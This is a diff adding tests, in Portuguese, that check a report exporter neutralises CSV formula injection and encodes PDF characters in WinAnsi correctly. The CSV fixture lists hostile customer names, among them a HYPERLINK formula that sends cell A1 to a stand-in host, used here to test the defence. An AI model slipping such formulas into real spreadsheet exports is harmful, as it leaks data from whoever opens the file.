@@ -151,3 +151,87 @@ describe("exportar", () => {
     expect(conteudo.toLowerCase()).not.toContain("salário");
   });
 });
+
+/**
+ * Injeção de fórmula em planilha (Fase 10, §12).
+ *
+ * O nome do cliente é escrito por um ANÔNIMO no checkout e sai no relatório
+ * de pedidos. `"=HYPERLINK(…)"` entre aspas não é texto para o Excel: ele
+ * consome as aspas na importação e avalia o que sobra. Quem abre o arquivo é
+ * a Shalon, na máquina dela.
+ */
+describe("CSV — conteúdo do usuário não vira fórmula", () => {
+  const hostil: Relatorio = {
+    ...RELATORIO,
+    tipo: "pedidos",
+    colunas: [
+      { chave: "cliente", rotulo: "Cliente", tipo: "texto" },
+      { chave: "total", rotulo: "Total", tipo: "dinheiro" },
+      { chave: "saldo", rotulo: "Saldo", tipo: "numero" },
+    ],
+    linhas: [
+      { cliente: '=HYPERLINK("http://ex.invalid/?"&A1,"Clique")', total: 10, saldo: -12.5 },
+      { cliente: "+1+1", total: 10, saldo: -12.5 },
+      { cliente: "-2+3", total: 10, saldo: -12.5 },
+      { cliente: "@SUM(1+1)", total: 10, saldo: -12.5 },
+      { cliente: "Maria Conceição", total: 10, saldo: -12.5 },
+    ],
+    totais: {},
+  };
+
+  const linhasDeDados = () =>
+    texto(gerarCsv(hostil).bytes)
+      .split("\r\n")
+      .filter((l) => l.includes(";"))
+      .slice(1);
+
+  it("nenhuma célula de texto começa por =, +, - ou @", () => {
+    for (const linha of linhasDeDados()) {
+      expect(linha.startsWith('"=')).toBe(false);
+      expect(linha.startsWith('"+')).toBe(false);
+      expect(linha.startsWith('"-')).toBe(false);
+      expect(linha.startsWith('"@')).toBe(false);
+    }
+  });
+
+  it("marca como literal e preserva o que o cliente escreveu", () => {
+    const linha = linhasDeDados()[0]!;
+    expect(linha.startsWith(`"'=HYPERLINK(`)).toBe(true);
+    expect(linha).toContain("http://ex.invalid/?");
+  });
+
+  it("não mexe em nome comum", () => {
+    expect(linhasDeDados()[4]!.startsWith('"Maria Conceição"')).toBe(true);
+  });
+
+  it("não prefixa número negativo, que precisa continuar somável", () => {
+    // A coluna `saldo` é `numero`: sai do nosso formatador, nunca do usuário.
+    for (const linha of linhasDeDados()) expect(linha).toContain('"-12,50"');
+  });
+});
+
+/**
+ * PDF e os caracteres que o próprio sistema gera (Fase 10, §12).
+ *
+ * O travessão de nulo e as reticências de corte vivem na faixa WinAnsi
+ * 0x80–0x9F, que NÃO é latin-1. Sem a tabela, o relatório em PDF mostra "?"
+ * exatamente onde a tela mostra "—".
+ */
+describe("PDF — WinAnsi", () => {
+  const comNulo: Relatorio = {
+    ...RELATORIO,
+    titulo: "Vendas — por dia",
+    linhas: [{ data: "2026-09-17", pedidos: 0, vendas_registradas: 0, ticket_medio: null }],
+  };
+  const conteudo = () => Buffer.from(gerarPdf(comNulo).bytes).toString("latin1");
+
+  it("grava o travessão de nulo como travessão, não como interrogação", () => {
+    expect(conteudo()).toContain("\x97"); // — em WinAnsi
+  });
+
+  it("mantém acento e cedilha", () => {
+    expect(Buffer.from(gerarPdf(RELATORIO).bytes).toString("latin1")).toContain(
+      "Ticket m\xe9dio",
+    );
+  });
+});
